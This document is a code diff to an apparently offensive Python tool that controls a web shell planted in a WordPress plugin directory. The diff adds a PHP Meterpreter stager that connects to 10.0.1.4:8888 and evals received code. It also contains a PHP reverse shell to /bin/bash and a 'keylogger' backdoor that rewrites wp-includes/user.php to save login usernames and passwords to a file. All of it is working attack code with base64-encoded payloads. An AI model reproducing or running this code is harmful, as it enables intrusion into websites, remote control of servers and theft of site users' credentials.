@@ -80,6 +80,8 @@ def commandloop(host,uploaddir):
             stealth(host, uploaddir)
         if cmd == "keylog":
             keylogger(host, uploaddir)
+        if cmd == "meterpreter":
+            meterpreter(host, uploaddir, "10.0.1.4", "8888")
         else:
             print "Sent command: " + cmd
             sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
@@ -119,8 +121,12 @@ def upgrade(host,uploaddir):
     ip = raw_input('IP Address: ')
     port = raw_input('Port: ')
     params = [('cmd', ('php -r \'$sock=fsockopen("' + ip + '",' + port + ');exec("/bin/bash -i <&3 >&3 2>&3");\'').encode('base64'))]
-    print "Sending reverse shell to " + ip + " port " + port
-    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    try:
+        print "Sending reverse shell to " + ip + " port " + port
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
+    except requests.exceptions.Timeout:
+        pass
+
 
 
 def stealth(host,uploaddir):
@@ -151,24 +157,96 @@ if (class_exists('ReflectionFunction')) {
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
 
 
+
+def meterpreter(host,uploaddir,ip,port):
+    code = '''<?php
+error_reporting(0);
+$ip   = '%s';
+$port = %s;
+if (($f = 'stream_socket_client') && is_callable($f)) {
+    $s      = $f("tcp://{$ip}:{$port}");
+    $s_type = 'stream';
+} elseif (($f = 'fsockopen') && is_callable($f)) {
+    $s      = $f($ip, $port);
+    $s_type = 'stream';
+} elseif (($f = 'socket_create') && is_callable($f)) {
+    $s   = $f(AF_INET, SOCK_STREAM, SOL_TCP);
+    $res = @socket_connect($s, $ip, $port);
+    if (!$res) {
+        die();
+    }
+    $s_type = 'socket';
+} else {
+    die('no socket funcs');
+}
+if (!$s) {
+    die('no socket');
+}
+switch ($s_type) {
+    case 'stream':
+        $len = fread($s, 4);
+        break;
+    case 'socket':
+        $len = socket_read($s, 4);
+        break;
+}
+if (!$len) {
+    die();
+}
+$a   = unpack("Nlen", $len);
+$len = $a['len'];
+$b   = '';
+while (strlen($b) < $len) {
+    switch ($s_type) {
+        case 'stream':
+            $b .= fread($s, $len - strlen($b));
+            break;
+        case 'socket':
+            $b .= socket_read($s, $len - strlen($b));
+            break;
+    }
+}
+$GLOBALS['msgsock']      = $s;
+$GLOBALS['msgsock_type'] = $s_type;
+eval($b);
+die();
+?>
+''' % (ip, port)
+    payload = code.encode('base64')
+    params = [
+        ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > meterpreter.php').encode('base64'))]
+    sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
+    params = [
+        ('cmd', 'php meterpreter.php'.encode('base64'))]
+    try:
+        print "Executing meterpreter stager to connect to " + ip + ":" + port
+        sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params, timeout=1)
+    except requests.exceptions.Timeout:
+        pass
+    print sendcommand.text
+
+
 def keylogger(host,uploaddir):
+
+    doop = '''$credentials['remember'] = false;
+     $file = 'wp-content/plugins/%s/passwords.txt';
+     $credz = date('Y-m-d') . " - Username: " . $_POST['log'] . " && Password: " . $_POST['pwd'] . "\n";
+     file_put_contents($file, $credz, FILE_APPEND | LOCK_EX);''' % (uploaddir)
+
+    payloaddoop = doop.encode('base64')
+    print payloaddoop
     evilcode = '''<?php
 $real = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7";
-$evil = "JGNyZWRlbnRpYWxzWydyZW1lbWJlciddID0gZmFsc2U7CiAgICAgJGZpbGUgPSAncGFzc3dvcmRzLnR4dCc7CiAgICAgJGNyZWR6ID0gZGF0ZSgnWS1tLWQnKSAuICIgLSBVc2VybmFtZTogIiAuICRfUE9TVFsnbG9nJ10gLiAiICYmIFBhc3N3b3JkOiAiIC4gJF9QT1NUWydwd2QnXSAuICJcbiI7CiAgICAgZmlsZV9wdXRfY29udGVudHMoJGZpbGUsICRjcmVkeiwgRklMRV9BUFBFTkQgfCBMT0NLX0VYKTs";
+$evil = "%s";
 $real = base64_decode($real);
 $evil = base64_decode($evil);
 
-//read the entire string
 $orig=file_get_contents('../../../wp-includes/user.php');
-
-//replace something in the file string - this is a VERY simple example
 $orig=str_replace("$real", "$evil",$orig);
-
-//write the entire string
 file_put_contents('../../../wp-includes/user.php', $orig);
-?>'''
+?>''' % payloaddoop
+    print evilcode
     payload = evilcode.encode('base64')
-
     params = [
         ('cmd', ('php -r \'echo base64_decode("' + payload + '");\' > backdoor.php').encode('base64'))]
     sendcommand = requests.get(host + "/wp-content/plugins/" + uploaddir + "/shell.php", params=params)
